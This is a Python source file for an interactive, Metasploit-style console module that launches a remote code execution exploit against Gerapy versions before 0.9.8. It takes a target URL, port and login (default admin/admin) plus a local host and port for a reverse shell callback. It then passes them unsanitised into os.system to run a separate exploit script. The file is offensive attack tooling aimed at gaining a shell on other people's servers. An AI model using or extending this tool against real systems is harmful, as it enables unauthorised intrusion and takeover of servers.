import os
import time
import colorama
import sys
import subprocess
from colorama import Fore
colorama.init()
LOGIN="admin"
PASSWORD="admin"
URL=""
PORT=""
LOCALHOST=""
LOCALPORT=""
shw = '''
Module Commands For "show"
==========================

      Command                          Description
      -------                          -----------
      show options                     Show options of the Module
'''
commands = '''
Module Commands For "show"
==========================

      Command                          Description
      -------                          -----------
      show options                     Show options of the Module

Module Commands
===============

      Command                          Description
      -------                          -----------
      set <option> <value>             Set specified option to specified value
      show <>                          Show specified command, options
      run                              Run the Module
'''
try:
    tmf = input('\033[4mtmf\033[0m-('+Fore.RED+'gerapy/log/rce_shell'+Fore.RESET+') > ').strip(" ")
except KeyboardInterrupt:
    exit()
tmf = tmf.split()
while True:
    if tmf == []:
        pass
    elif tmf[0] == 'help':
        print(commands)
    elif tmf[0] == 'clear':
        os.system('clear')
    elif tmf[0] == 'back' or tmf[0] == 'exit':
        sys.exit()
    elif tmf[0] == 'show':
        if len(tmf) < 2:
            print(shw)
        else:
            try:
                if tmf[1] == 'options':
                    print('''
Module ('''+Fore.RED+'''gerapy/log/rce_shell'''+Fore.RESET+''') "Login" Options:

      Option          Rank              Description                                     Current Value
      --------        ------            -------------                                   ---------------
      LOGIN           Required          Login To System (Default: admin)                '''+LOGIN+'''
      PASSWORD        Required          Password To Login (Default: admin)              '''+PASSWORD+'''

Module ('''+Fore.RED+'''gerapy/log/rce_shell'''+Fore.RESET+''') "Advanced" Options:

      Option          Rank              Description                                     Current Value
      --------        ------            -------------                                   ---------------
      URL             Required          Target URL                                      '''+URL+'''
      PORT            Required          Target PORT                                     '''+PORT+'''
      LOCALHOST       Required          Local host Address                              '''+LOCALHOST+'''
      LOCALPORT       Required          Local port                                      '''+LOCALPORT+'''

Module About:

      Module Title : Gerapy - Remote Code Execution
      Author       : Jeremiasz Pluta
      Version      : All versions of Gerapy prior to 0.9.8

Module Details:

      This Module Has No Details.
''')
                else:
                    print(shw)
                    print(Fore.RED+'[-]'+Fore.RESET+' Invalid Command For "show": "'+tmf[1]+'"')
            except:
                pass
    elif tmf[0] == 'set':
        if len(tmf) < 3:
            print(Fore.RED+'[-]'+Fore.RESET+' Usage: set <option> <value>')
        else:
            try:
                if tmf[1] == 'LOGIN' or tmf[1] == 'login':
                    LOGIN=tmf[2]
                    print(Fore.BLUE+'[*]'+Fore.RESET+' LOGIN ==> '+LOGIN)
                elif tmf[1] == 'PASSWORD' or tmf[1] == 'password':
                    PASSWORD=tmf[2]
                    print(Fore.BLUE+'[*]'+Fore.RESET+' PASSWORD ==> '+PASSWORD)
                elif tmf[1] == 'URL' or tmf[1] == 'url':
                    URL=tmf[2]
                    print(Fore.BLUE+'[*]'+Fore.RESET+' URL ==> '+URL)
                elif tmf[1] == 'PORT' or tmf[1] == 'port':
                    PORT=tmf[2]
                    print(Fore.BLUE+'[*]'+Fore.RESET+' PORT ==> '+PORT)
                elif tmf[1] == 'LOCALHOST' or tmf[1] == 'localhost':
                    LOCALHOST=tmf[2]
                    print(Fore.BLUE+'[*]'+Fore.RESET+' LOCALHOST ==> '+LOCALHOST)
                elif tmf[1] == 'LOCALPORT' or tmf[1] == 'localport':
                    LOCALPORT=tmf[2]
                    print(Fore.BLUE+'[*]'+Fore.RESET+' LOCALPORT ==> '+LOCALPORT)
                else:
                    print(Fore.RED+'[-]'+Fore.RESET+' Please Specify a Valid Option!')
            except:
                pass
    elif tmf[0] == 'run':
        if URL == "" or PORT == "" or LOCALHOST == "" or LOCALPORT == "":
            print(Fore.RED+'[-]'+Fore.RESET+' Please Set Options First!')
        else:
            try:
                os.system('python3 /usr/share/Terminator/modules/exploits/gerapy.py -t '+URL+' -p '+PORT+' -L '+LOCALHOST+' -P '+LOCALPORT+' -Lo '+LOGIN+' -Lp '+PASSWORD)
                print(Fore.BLUE+'[*]'+Fore.RESET+' Module Execution Completed.')
            except Exception:
                pass
    else:
        print(Fore.RED+'[-]'+Fore.RESET+' Unknown Command: "'+tmf[0]+'"')
    try:
        tmf = input('\033[4mtmf\033[0m-('+Fore.RED+'gerapy/log/rce_shell'+Fore.RESET+') > ').strip(" ")
    except KeyboardInterrupt:
        exit()
    tmf = tmf.split()
